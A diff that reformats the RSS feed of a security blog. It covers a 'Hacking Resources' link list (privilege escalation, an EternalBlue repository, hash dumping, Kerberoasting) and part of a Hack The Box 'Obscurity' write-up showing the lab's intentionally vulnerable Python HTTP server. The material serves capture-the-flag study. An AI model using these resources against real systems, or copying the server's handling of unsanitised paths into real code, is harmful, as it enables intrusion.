@@ -1,20 +1,4 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>Posts on Ceso Adventures</title>
-        <link>https://ceso.github.io/posts/</link>
-        <description>Recent content in Posts on Ceso Adventures</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Fri, 04 Dec 2020 00:00:00 +0000</lastBuildDate>
-        <atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Hacking Resources</title>
-            <link>https://ceso.github.io/posts/2020/12/hacking-resources/</link>
-            <pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid>
-            <description>Usefull Web Browser plugins  https://www.wappalyzer.com/download/ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ &amp;lt;&amp;mdash;&amp;mdash; For Firefox https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp &amp;lt;&amp;mdash;&amp;mdash; For Chrome https://cookie-editor.cgagnier.ca/#download https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/  Cool Tools/Labs  https://www.blacklanternsecurity.com/2020-12-02-WriteHat/ https://github.com/madhuakula/kubernetes-goat https://github.com/m8r0wn/ActiveReign https://github.com/sundowndev/PhoneInfoga https://github.com/GoSecure/dtd-finder https://www.shodan.io/ https://crt.sh https://dnsdumpster.com/ https://mxtoolbox.com/  Linux Privilege Escalation  https://gtfobins.github.io/ https://book.hacktricks.xyz/linux-unix/privilege-escalation https://guif.re/linuxeop https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.win.tue.nl/~aeb/linux/hh/hh-8.html http://www.dankalia.com/tutor/01005/0100501004.htm  Windows Privilege Escalation  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ http://www.fuzzysecurity.com/tutorials/16.html https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md https://github.com/worawit/MS17-010 &amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF https://github.com/ankh2054/windows-pentest https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://github.com/frizb/Windows-Privilege-Escalation  Windows stuff  http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf https://www.lemoda.net/windows/windows2unix/windows2unix.html https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/ https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://malicious.link/post/2016/kerberoast-pt1/  Exploit Development/Reversing  https://www.</description>
-            <content type="html"><![CDATA[<h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins</h4>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Ceso Adventures</title><link>https://ceso.github.io/posts/</link><description>Recent content in Posts on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 04 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hacking Resources</title><link>https://ceso.github.io/posts/2020/12/hacking-resources/</link><pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid><description>Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ &amp;lt;&amp;mdash;&amp;mdash; For Firefox https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp &amp;lt;&amp;mdash;&amp;mdash; For Chrome https://cookie-editor.cgagnier.ca/#download https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/ Cool Tools/Labs https://www.blacklanternsecurity.com/2020-12-02-WriteHat/ https://github.com/madhuakula/kubernetes-goat https://github.com/m8r0wn/ActiveReign https://github.com/sundowndev/PhoneInfoga https://github.com/GoSecure/dtd-finder https://www.shodan.io/ https://crt.sh https://dnsdumpster.com/ https://mxtoolbox.com/ Linux Privilege Escalation https://gtfobins.github.io/ https://book.hacktricks.xyz/linux-unix/privilege-escalation https://guif.re/linuxeop https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.win.tue.nl/~aeb/linux/hh/hh-8.html http://www.dankalia.com/tutor/01005/0100501004.htm Windows Privilege Escalation https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ http://www.fuzzysecurity.com/tutorials/16.html https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md https://github.com/worawit/MS17-010 &amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF https://github.com/ankh2054/windows-pentest https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://github.com/frizb/Windows-Privilege-Escalation Windows stuff http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf https://www.lemoda.net/windows/windows2unix/windows2unix.html https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/ https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://malicious.link/post/2016/kerberoast-pt1/ Exploit Development/Reversing https://www.</description><content type="html"><![CDATA[<h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins</h4>
 <ul>
 <li><a href="https://www.wappalyzer.com/download/">https://www.wappalyzer.com/download/</a></li>
 <li><a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</a> <strong>&lt;&mdash;&mdash; For Firefox</strong></li>
@@ -175,18 +159,8 @@
 <li><a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/">https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/</a></li>
 <li><a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/">https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/</a></li>
 </ul>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - Obscurity</title>
-            <link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link>
-            <pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid>
-            <description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
-I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
+I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description><content type="html"><![CDATA[
     <img src="/images/htb/obscurity/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -380,60 +354,60 @@ develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 <span style="color:#f92672">import</span> urllib.parse
 <span style="color:#f92672">import</span> subprocess
 
-respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">HTTP/1.1 {statusNum} {statusCode}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Date: {dateSent}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Server: {server}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Last-Modified: {modified}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Content-Length: {length}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Content-Type: {contentType}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Connection: {connectionType}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">{body}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DocRoot</span><span style="color:#e6db74">&#34;</span>
+respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
+</span><span style="color:#e6db74">Date: {dateSent}
+</span><span style="color:#e6db74">Server: {server}
+</span><span style="color:#e6db74">Last-Modified: {modified}
+</span><span style="color:#e6db74">Content-Length: {length}
+</span><span style="color:#e6db74">Content-Type: {contentType}
+</span><span style="color:#e6db74">Connection: {connectionType}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">{body}
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DocRoot&#34;</span>
 
-CODES <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">200</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#34;</span>, 
-        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">304</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">NOT MODIFIED</span><span style="color:#e6db74">&#34;</span>,
-        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">400</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">BAD REQUEST</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">401</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">UNAUTHORIZED</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">403</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FORBIDDEN</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">404</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">NOT FOUND</span><span style="color:#e6db74">&#34;</span>, 
-        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">500</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">INTERNAL SERVER ERROR</span><span style="color:#e6db74">&#34;</span>}
+CODES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;200&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, 
+        <span style="color:#e6db74">&#34;304&#34;</span>: <span style="color:#e6db74">&#34;NOT MODIFIED&#34;</span>,
+        <span style="color:#e6db74">&#34;400&#34;</span>: <span style="color:#e6db74">&#34;BAD REQUEST&#34;</span>, <span style="color:#e6db74">&#34;401&#34;</span>: <span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span>, <span style="color:#e6db74">&#34;403&#34;</span>: <span style="color:#e6db74">&#34;FORBIDDEN&#34;</span>, <span style="color:#e6db74">&#34;404&#34;</span>: <span style="color:#e6db74">&#34;NOT FOUND&#34;</span>, 
+        <span style="color:#e6db74">&#34;500&#34;</span>: <span style="color:#e6db74">&#34;INTERNAL SERVER ERROR&#34;</span>}
 
-MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">txt</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/plain</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">css</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/css</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">html</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/html</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">png</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">image/png</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">jpg</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">image/jpg</span><span style="color:#e6db74">&#34;</span>, 
-        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ttf</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">application/octet-stream</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">otf</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">application/octet-stream</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">woff</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">font/woff</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">woff2</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">font/woff2</span><span style="color:#e6db74">&#34;</span>, 
-        <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">js</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">application/javascript</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">gz</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">application/zip</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">py</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/plain</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">map</span><span style="color:#e6db74">&#34;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">application/octet-stream</span><span style="color:#e6db74">&#34;</span>}
+MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt&#34;</span>: <span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;css&#34;</span>:<span style="color:#e6db74">&#34;text/css&#34;</span>, <span style="color:#e6db74">&#34;html&#34;</span>:<span style="color:#e6db74">&#34;text/html&#34;</span>, <span style="color:#e6db74">&#34;png&#34;</span>: <span style="color:#e6db74">&#34;image/png&#34;</span>, <span style="color:#e6db74">&#34;jpg&#34;</span>:<span style="color:#e6db74">&#34;image/jpg&#34;</span>, 
+        <span style="color:#e6db74">&#34;ttf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,<span style="color:#e6db74">&#34;otf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>, <span style="color:#e6db74">&#34;woff&#34;</span>:<span style="color:#e6db74">&#34;font/woff&#34;</span>, <span style="color:#e6db74">&#34;woff2&#34;</span>: <span style="color:#e6db74">&#34;font/woff2&#34;</span>, 
+        <span style="color:#e6db74">&#34;js&#34;</span>:<span style="color:#e6db74">&#34;application/javascript&#34;</span>,<span style="color:#e6db74">&#34;gz&#34;</span>:<span style="color:#e6db74">&#34;application/zip&#34;</span>, <span style="color:#e6db74">&#34;py&#34;</span>:<span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;map&#34;</span>: <span style="color:#e6db74">&#34;application/octet-stream&#34;</span>}
 
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Response</span>:
-    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span><span style="color:#f92672">*</span>kwargs):
+    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
         self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
         now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
-        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%</span><span style="color:#e6db74">b </span><span style="color:#e6db74">%</span><span style="color:#e6db74">Y </span><span style="color:#e6db74">%</span><span style="color:#e6db74">H:</span><span style="color:#e6db74">%</span><span style="color:#e6db74">M:</span><span style="color:#e6db74">%</span><span style="color:#e6db74">S</span><span style="color:#e6db74">&#34;</span>)
+        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">stringResponse</span>(self):
-        <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">*</span><span style="color:#f92672">*</span>self<span style="color:#f92672">.</span>__dict__)
+        <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
     <span style="color:#66d9ef">def</span> __init__(self, request):
         self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> True
         <span style="color:#66d9ef">try</span>:
             request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
-            self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">method</span><span style="color:#e6db74">&#34;</span>]
-            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">doc</span><span style="color:#e6db74">&#34;</span>]
-            self<span style="color:#f92672">.</span>vers <span style="color:#f92672">=</span> request[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">vers</span><span style="color:#e6db74">&#34;</span>]
-            self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">header</span><span style="color:#e6db74">&#34;</span>]
-            self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">body</span><span style="color:#e6db74">&#34;</span>]
+            self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;method&#34;</span>]
+            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]
+            self<span style="color:#f92672">.</span>vers <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;vers&#34;</span>]
+            self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;header&#34;</span>]
+            self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;body&#34;</span>]
         <span style="color:#66d9ef">except</span>:
             self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> False
 
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):        
-        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span>)
+        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
         header <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
         body <span style="color:#f92672">=</span> req[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
         headerDict <span style="color:#f92672">=</span> {}
         <span style="color:#66d9ef">for</span> param <span style="color:#f92672">in</span> header:
-            pos <span style="color:#f92672">=</span> param<span style="color:#f92672">.</span>find(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#34;</span>)
+            pos <span style="color:#f92672">=</span> param<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;: &#34;</span>)
             key, val <span style="color:#f92672">=</span> param[:pos], param[pos<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
             headerDict<span style="color:#f92672">.</span>update({key: val})
-        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">method</span><span style="color:#e6db74">&#34;</span>: method, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">doc</span><span style="color:#e6db74">&#34;</span>: doc, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">vers</span><span style="color:#e6db74">&#34;</span>: vers, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">header</span><span style="color:#e6db74">&#34;</span>: headerDict, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">body</span><span style="color:#e6db74">&#34;</span>: body}
+        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;method&#34;</span>: method, <span style="color:#e6db74">&#34;doc&#34;</span>: doc, <span style="color:#e6db74">&#34;vers&#34;</span>: vers, <span style="color:#e6db74">&#34;header&#34;</span>: headerDict, <span style="color:#e6db74">&#34;body&#34;</span>: body}
 
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Server</span>:
@@ -463,7 +437,7 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><
                     client<span style="color:#f92672">.</span>shutdown()
                     client<span style="color:#f92672">.</span>close()
                 <span style="color:#66d9ef">else</span>:
-                    <span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Client disconnected</span><span style="color:#e6db74">&#39;</span>)
+                    <span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>)
             <span style="color:#66d9ef">except</span>:
                 client<span style="color:#f92672">.</span>close()
                 <span style="color:#66d9ef">return</span> False
@@ -476,19 +450,19 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><
 <span style="color:#75715e">#            except Exception as e:</span>
 <span style="color:#75715e">#                print(e)</span>
             document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
-            statusNum<span style="color:#f92672">=</span>document[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">status</span><span style="color:#e6db74">&#34;</span>]
+            statusNum<span style="color:#f92672">=</span>document[<span style="color:#e6db74">&#34;status&#34;</span>]
         <span style="color:#66d9ef">else</span>:
-            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/errors/400.html</span><span style="color:#e6db74">&#34;</span>, DOC_ROOT)
-            statusNum<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">400</span><span style="color:#e6db74">&#34;</span>
-        body <span style="color:#f92672">=</span> document[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">body</span><span style="color:#e6db74">&#34;</span>]
+            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(<span style="color:#e6db74">&#34;/errors/400.html&#34;</span>, DOC_ROOT)
+            statusNum<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>
+        body <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;body&#34;</span>]
         
         statusCode<span style="color:#f92672">=</span>CODES[statusNum]
-        dateSent <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
-        server <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">BadHTTPServer</span><span style="color:#e6db74">&#34;</span>
-        modified <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+        dateSent <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+        server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BadHTTPServer&#34;</span>
+        modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
         length <span style="color:#f92672">=</span> len(body)
-        contentType <span style="color:#f92672">=</span> document[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">mime</span><span style="color:#e6db74">&#34;</span>] <span style="color:#75715e"># Try and identify MIME type from string</span>
-        connectionType <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Closed</span><span style="color:#e6db74">&#34;</span>
+        contentType <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;mime&#34;</span>] <span style="color:#75715e"># Try and identify MIME type from string</span>
+        connectionType <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Closed&#34;</span>
 
 
         resp <span style="color:#f92672">=</span> Response(
@@ -508,39 +482,39 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
         path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
         <span style="color:#66d9ef">try</span>:
-            info <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">output = </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Document: {}</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
